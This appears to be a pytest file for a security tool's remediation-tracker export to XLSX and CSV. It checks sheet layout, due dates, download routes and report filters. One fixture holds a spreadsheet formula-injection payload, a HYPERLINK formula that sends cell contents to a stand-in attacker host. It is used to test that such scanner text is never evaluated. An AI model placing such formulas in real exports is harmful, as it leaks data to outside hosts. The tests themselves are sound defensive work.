"""test_remediation_export.py — the XLSX/CSV remediation tracker."""
from __future__ import annotations

import asyncio
import csv
import io
import uuid
import zipfile
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import MagicMock

from openpyxl import load_workbook

from app.models.enums import FindingSeverity, FindingStatus
from app.remediation import export as X
from app.remediation.bundles import build_bundles
from app.remediation.context import build_context

NOW = datetime(2026, 9, 27, 6, 30, tzinfo=timezone.utc)   # 12:00 IST


def _items():
    out = []
    for i, status in ((1, FindingStatus.open), (2, FindingStatus.remediated)):
        f = SimpleNamespace(id=uuid.uuid4(), title="SMBv1 enabled", description="", remediation="",
                            severity=FindingSeverity.critical, status=status,
                            evidence={"rule_id": "POSTURE-SMB-V1-ENABLED", "port": 445}, cve_ids=[],
                            epss_score=None, exploit_validated=False, resolved_at=NOW if i == 2 else None)
        a = SimpleNamespace(ip_address=f"10.0.0.{i}", hostname=f"fs{i}", fqdn=None, os="Windows",
                            os_version="Windows Server 2019", asset_type=SimpleNamespace(value="server"),
                            criticality=SimpleNamespace(value="high"), environment=None, tags=None)
        due = {"at": NOW, "source": "engagement"} if status == FindingStatus.open else {"at": None, "source": None}
        out.append((f, build_context(f, a, None), due))
    return out


def _sheets():
    items = _items()
    ext = SimpleNamespace(status="approved", member_finding_ids=[items[0][0].id],
                          reason="Waiting for the change freeze to end", requested_due_at=NOW + timedelta(days=30),
                          decided_due_at=NOW + timedelta(days=14), requested_at=NOW)
    return X.build_rows(build_bundles(items, now=NOW), items, [ext])


def test_rows_cover_all_views():
    sheets = _sheets()
    assert set(sheets) == set(X.SHEETS)
    fix_h, fix_rows = sheets["By fix"]
    assert len(fix_rows) == 1 and fix_rows[0][0].startswith("FIX-")
    assert fix_rows[0][8:10] == [1, 1]                 # open, closed
    _, host_rows = sheets["By host checklist"]
    assert {r[7] for r in host_rows} == {"open", "closed"}
    find_h, find_rows = sheets["Findings"]
    open_row = next(r for r in find_rows if r[3] == "open")
    assert open_row[13] == "Waiting for the change freeze to end"
    assert open_row[14] == datetime(2026, 10, 11, 12, 0)   # decided date, IST, naive for Excel


def test_xlsx_structure():
    data = X.to_xlsx(_sheets(), title="Remediation tracker — Bank VA")
    wb = load_workbook(io.BytesIO(data))
    assert wb.sheetnames == list(X.SHEETS)
    ws = wb["By fix"]
    assert ws.freeze_panes == "A2"
    assert ws.auto_filter.ref
    due_col = [c.value for c in ws[1]].index("Due (IST)") + 1
    cell = ws.cell(row=2, column=due_col)
    assert isinstance(cell.value, datetime) and cell.value == datetime(2026, 9, 27, 12, 0)
    assert cell.number_format == "yyyy-mm-dd hh:mm"


def test_csv_zip():
    data = X.to_csv_zip(_sheets())
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        assert sorted(zf.namelist()) == ["by_fix.csv", "by_host_checklist.csv", "findings.csv"]
        rows = list(csv.reader(io.StringIO(zf.read("findings.csv").decode("utf-8-sig"))))
    assert rows[0][0] == "Finding ID" and len(rows) == 3
    assert "2026-10-11 12:00" in {c for r in rows for c in r}


def test_route_returns_attachment(monkeypatch):
    from app.remediation import service as RS
    from app.routers import remediation
    from app.schemas.auth import CurrentUser

    async def fake_bundles(db, engagement, tenant_id, finding_ids=None):
        items = _items()
        return {"bundles": build_bundles(items, now=NOW), "items": items, "sla_source": "engagement"}

    monkeypatch.setattr(RS, "engagement_bundles", fake_bundles)
    eng = SimpleNamespace(id=uuid.uuid4(), name="Bank VA / Q3")

    class _DB:
        def __init__(self):
            self.n = 0

        async def execute(self, *a, **k):
            self.n += 1
            r = MagicMock()
            r.scalar_one_or_none = MagicMock(return_value=eng)
            r.scalars = MagicMock(return_value=MagicMock(all=MagicMock(return_value=[])))
            return r

    user = CurrentUser(user_id=uuid.uuid4(), tenant_id=uuid.uuid4(), role="analyst")
    resp = asyncio.run(remediation.export_remediation(eng.id, _DB(), user, format="xlsx"))
    assert resp.media_type.endswith("spreadsheetml.sheet")
    disp = resp.headers["content-disposition"]
    assert 'filename="vedha-remediation-Bank-VA-Q3-' in disp and disp.endswith('.xlsx"')


def _hostile_sheets():
    """A finding title is scanner-derived text — a hostile banner can start with '='."""
    sheets = _sheets()
    head, rows = sheets["Findings"]
    rows[0][1] = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    rows[1][1] = "@SUM(1+1)"
    return sheets


def test_xlsx_never_stores_scanner_text_as_a_formula():
    wb = load_workbook(io.BytesIO(X.to_xlsx(_hostile_sheets(), title="t")))
    ws = wb["Findings"]
    titles = [ws.cell(row=r, column=2) for r in (2, 3)]
    assert all(c.data_type == "s" for c in titles)
    assert titles[0].value.startswith('=HYPERLINK')          # shown verbatim, never evaluated


def test_csv_neutralises_formula_prefixes():
    data = X.to_csv(_hostile_sheets(), "Findings")
    rows = list(csv.reader(io.StringIO(data.decode("utf-8-sig"))))
    assert rows[1][1].startswith("'=HYPERLINK") and rows[2][1] == "'@SUM(1+1)"
    zipped = X.to_csv_zip(_hostile_sheets())
    with zipfile.ZipFile(io.BytesIO(zipped)) as zf:
        zrows = list(csv.reader(io.StringIO(zf.read("findings.csv").decode("utf-8-sig"))))
    assert zrows[1][1].startswith("'=")


def test_csv_single_sheet():
    data = X.to_csv(_sheets(), "Findings")
    assert data.startswith("﻿".encode())                 # Excel opens UTF-8 correctly
    rows = list(csv.reader(io.StringIO(data.decode("utf-8-sig"))))
    assert rows[0][0] == "Finding ID" and len(rows) == 3
    assert "2026-10-11 12:00" in {c for r in rows for c in r}


def test_route_single_csv_sheet(monkeypatch):
    from app.remediation import service as RS
    from app.routers import remediation
    from app.schemas.auth import CurrentUser

    async def fake_bundles(db, engagement, tenant_id, finding_ids=None):
        items = _items()
        return {"bundles": build_bundles(items, now=NOW), "items": items, "sla_source": "engagement"}

    monkeypatch.setattr(RS, "engagement_bundles", fake_bundles)
    eng = SimpleNamespace(id=uuid.uuid4(), name="Bank VA")

    class _DB:
        async def execute(self, *a, **k):
            r = MagicMock()
            r.scalar_one_or_none = MagicMock(return_value=eng)
            r.scalars = MagicMock(return_value=MagicMock(all=MagicMock(return_value=[])))
            return r

    user = CurrentUser(user_id=uuid.uuid4(), tenant_id=uuid.uuid4(), role="analyst")
    resp = asyncio.run(remediation.export_remediation(eng.id, _DB(), user, format="csv", sheet="findings"))
    assert resp.media_type.startswith("text/csv")
    disp = resp.headers["content-disposition"]
    assert "vedha-findings-Bank-VA-" in disp and disp.endswith('.csv"')
    assert resp.body.decode("utf-8-sig").startswith("Finding ID,")


# ── Report filters reach the tracker ────────────────────────────────────────
# The Reports page's Excel/CSV must contain exactly the findings its filters
# show on screen — the same rule set as the findings list, not a re-implementation.

def test_filters_active_only_when_something_is_set():
    from app.routers.findings import FindingFilters
    assert not FindingFilters().active()
    assert FindingFilters(search="smb").active()
    assert FindingFilters(sla_breached=True).active()
    assert not FindingFilters(search="   ").active()


def _patch_bundles(monkeypatch):
    from app.remediation import service as RS
    items = _items()

    async def fake_items(db, engagement_id):
        return [(f, ctx) for f, ctx, _ in items]

    async def fake_windows(db, tenant_id, engagement):
        return {}, "engagement"

    dues = {f.id: due for f, _, due in items}
    monkeypatch.setattr(RS, "load_engagement_items", fake_items)
    monkeypatch.setattr(RS, "windows_for", fake_windows)
    monkeypatch.setattr(RS, "due_for", lambda f, windows, source: dues[f.id])
    monkeypatch.setattr(RS, "project_now", lambda: NOW)
    return items


def test_engagement_bundles_restricted_to_finding_ids(monkeypatch):
    from app.remediation import service as RS
    items = _patch_bundles(monkeypatch)
    keep = items[0][0].id
    data = asyncio.run(RS.engagement_bundles(None, SimpleNamespace(id=uuid.uuid4()), uuid.uuid4(),
                                             finding_ids={keep}))
    assert [f.id for f, _, _ in data["items"]] == [keep]
    assert sum(b["open_count"] + b["closed_count"] for b in data["bundles"]) == 1
    everything = asyncio.run(RS.engagement_bundles(None, SimpleNamespace(id=uuid.uuid4()), uuid.uuid4()))
    assert len(everything["items"]) == 2


def test_route_passes_report_filters_to_the_tracker(monkeypatch):
    from app.remediation import service as RS
    from app.routers import findings as FR
    from app.routers import remediation
    from app.schemas.auth import CurrentUser

    items = _patch_bundles(monkeypatch)
    open_id = next(f.id for f, _, _ in items if f.status == FindingStatus.open)
    seen = {}

    async def fake_ids(db, user, engagement_id, filters):
        seen["filters"] = filters
        return {open_id}

    monkeypatch.setattr(FR, "filtered_finding_ids", fake_ids)
    eng = SimpleNamespace(id=uuid.uuid4(), name="Bank VA")

    class _DB:
        async def execute(self, *a, **k):
            r = MagicMock()
            r.scalar_one_or_none = MagicMock(return_value=eng)
            r.scalars = MagicMock(return_value=MagicMock(all=MagicMock(return_value=[])))
            return r

    user = CurrentUser(user_id=uuid.uuid4(), tenant_id=uuid.uuid4(), role="analyst")
    filters = FR.FindingFilters(status_filter=FindingStatus.open)
    resp = asyncio.run(remediation.export_remediation(eng.id, _DB(), user, format="csv", sheet="findings",
                                                      filters=filters))
    assert seen["filters"] is filters
    rows = list(csv.reader(io.StringIO(resp.body.decode("utf-8-sig"))))
    assert len(rows) == 2 and rows[1][0] == str(open_id)       # header + the one open finding
